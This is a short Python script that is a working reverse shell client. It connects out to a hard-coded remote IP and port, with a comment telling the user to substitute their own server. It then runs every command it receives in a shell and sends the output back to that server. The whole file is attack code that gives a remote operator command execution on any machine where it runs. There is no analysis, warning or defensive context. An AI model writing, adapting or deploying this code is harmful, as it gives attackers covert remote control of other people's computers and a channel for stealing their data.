import socket
import os
import subprocess


def connect():
    # Initialize the socket and connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.169.94.129", 8080))  # Replace with your server's IP and port
    current_dir = os.getcwd()  # Track the current working directory

    while True:
        # Receive a command from the server
        command = s.recv(1024).decode().strip()

        if not command:
            continue

        # Terminate connection if the command is 'terminate'
        if command.lower() == "terminate":
            s.close()
            break

        # Handle 'cd' command: change directory and send the new directory back
        elif command.startswith("cd "):
            try:
                path = command[3:].strip()
                os.chdir(path)
                current_dir = os.getcwd()
                s.send(f"[+] Changed directory to {current_dir}".encode())
            except Exception as e:
                s.send(f"[-] Failed to change directory: {str(e)}".encode())

        # For all other commands, execute them using subprocess
        else:
            process = subprocess.Popen(
                command,
                shell=True,
                cwd=current_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            output, error = process.communicate()
            s.send(output)
            s.send(error)


def main():
    connect()


if __name__ == "__main__":
    main()
